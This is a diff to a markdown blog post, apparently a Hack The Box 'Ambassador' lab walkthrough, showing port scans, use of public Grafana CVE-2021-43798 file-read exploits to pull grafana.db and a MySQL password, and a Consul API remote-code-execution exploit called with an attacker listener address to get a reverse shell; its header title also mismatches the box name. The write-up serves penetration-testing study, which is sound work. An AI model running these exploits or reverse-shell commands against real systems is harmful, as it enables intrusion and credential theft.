@@ -11,7 +11,7 @@ render_with_liquid: false
 HTB — Investigation
 ================
 
-A detailed walkthrough for solving Ambassador Box on Hack The Box. The box contains vulnerability like Arbitrary File Read CVE-\[2021–43798\](https://nvd.nist.gov/vuln/detail/CVE-2021-43798), weak encryption and Remote Code Execution on consul.
+A detailed walkthrough for solving Ambassador Box on Hack The Box. The box contains vulnerability like Arbitrary File Read [CVE-2021–43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798), weak encryption and Remote Code Execution on consul.
 
 <img alt="" class="bf jp jq dj" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*s0bTWtngRQisodmZFEQqkA.png" width="700" height="529">
 
@@ -31,7 +31,7 @@ Discovered open port 80/tcp on 10.10.11.183
 Discovered open port 3000/tcp on 10.10.11.183
 ```
 
-Add 10.10.11.183 on /etc/hosts as ambassador.htb. Nothing much found on the web application. Let’s enumerate the directory.
+Add 10.10.11.183 on **/etc/hosts** as ambassador.htb. Nothing much found on the web application. Let’s enumerate the directory.
 
 **Directory Busting**
 
@@ -78,7 +78,7 @@ Let’s open the port 3000 on a browser. We can find that the application has in
 
 **Exploitation**
 
-Download the Grafana Exploit from \[https://www.exploit-db.com/exploits/50581\](https://www.exploit-db.com/exploits/50581).
+Download the Grafana Exploit from [https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581).
 
 Enter the command as below
 
@@ -96,26 +96,26 @@ Pass /etc/grafana/grafana.ini on the above script.
 
 We also know that when Grafana is installed, it creates the database under directory **/var/lib/grafana/grafana.db.** Let’s download the database file and view if we could get any more information. The above script does not download the file.
 
-Run this exploit to download the grafana.db \[https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798\](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)
+Run this exploit to download the grafana.db [https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)
 
 ```bash
 git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798  
 cd exploit-grafana-CVE-2021-43798  
 pip install -r requirements.txt  
   
-\# Collect all Grafana URLs in a single file. For example: targets.txt  
+# Collect all Grafana URLs in a single file. For example: targets.txt  
 python3 exploit.py  
   
-\# It will download the file 
+# It will download the file 
 ```
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*BUk3ypayBLVMbDB1Fms07w.png" width="700" height="431">
 
-Copy the grafana.db from ./http\_ambassador\_htb\_3000/grafana.db to your current working directory and connect to the db file with sqlite3.
+Copy the grafana.db from ./http_ambassador_htb_3000_grafana.db to your current working directory and connect to the db file with sqlite3.
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*m1Exqsp5HaSLtbH_ADNhrA.png" width="700" height="651">
 
-There is a table called data\_source. Dump the table. We can find a mysql password there.
+There is a table called data_source. Dump the table. We can find a mysql password there.
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*gi24zRZxcYtQ_9qNEhQzJA.png" width="700" height="334">
 
@@ -153,7 +153,7 @@ Here you will get your user flag.
 
 **Privilege Escalation**
 
-\[Download linpeas and run it on your box.\](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+[Download linpeas and run it on your box.](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
 There were some CVEs displayed by linpeas but non of them worked for escalation. I started navigating and analysing the directories manually. In a process I found /opt/my-app directory. Tried to list all the files and folders including hidden on it, I found .git directory. Therefore I tried to view the git logs on it.
 
@@ -165,7 +165,7 @@ Viewing the logs, I found four different commit. Viewing all the commits, I foun
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*dyg1WqKln2d5Lkf7LKHKSg.png" width="700" height="270">
 
-Download the exploit \[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API\](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)
+Download the exploit [https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*s2RCMmZ0G7_x-X8uGFp0LQ.png" width="700" height="175">
 
@@ -194,4 +194,3 @@ python3 exploit.py -rh 127.0.0.1 --rp 8500 -lh 10.10.14.20 -lp 4445 -tk bb03b43b
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*AN2ay09MN33NdU06o7KizA.png" width="700" height="147">
 
 Here we go! Happy Hacking.
-](2023-02-01-htb-ambassador.md)
